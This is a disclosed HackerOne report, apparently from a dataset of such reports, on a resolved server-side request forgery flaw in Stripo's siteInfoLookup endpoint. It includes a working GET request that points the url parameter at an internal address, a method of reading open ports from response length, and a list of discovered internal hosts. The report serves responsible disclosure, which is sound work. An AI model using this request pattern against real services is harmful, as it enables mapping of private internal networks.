---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '738553'
original_report_id: '738553'
title: SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX
weakness: Server-Side Request Forgery (SSRF)
team_handle: stripo
created_at: '2019-11-15T16:40:02.588Z'
disclosed_at: '2019-12-18T10:23:14.982Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: my.stripo.email
asset_type: URL
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX

## Metadata

- HackerOne Report ID: 738553
- Weakness: Server-Side Request Forgery (SSRF)
- Program: stripo
- Disclosed At: 2019-12-18T10:23:14.982Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
SSRF vulnerability allows mapping the internal network.

## Steps To Reproduce:
It is possible to run internal requests with the siteInfoLookup service.

```
GET /cabinet/stripeapi/v1/siteInfoLookup?url=http://10.0.0.100:8080 HTTP/1.1
Host: my.stripo.email
```

Based on the response we know if the ip / port is available or not.

The port is not accesible in that IP.
```
Content-Length: 0
```

The port is accesible in that IP.
```
Content-Length: 114 (>0)
```

## Supporting Material/References:
I was able to identify some internal IP address and open ports:
10.0.0.2:8080
10.0.0.3:8080
10.0.0.4:8080
10.0.0.5:8080 <- NOT ACCESIBLE

## Impact

It is possible to use this vulnerability to map the internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
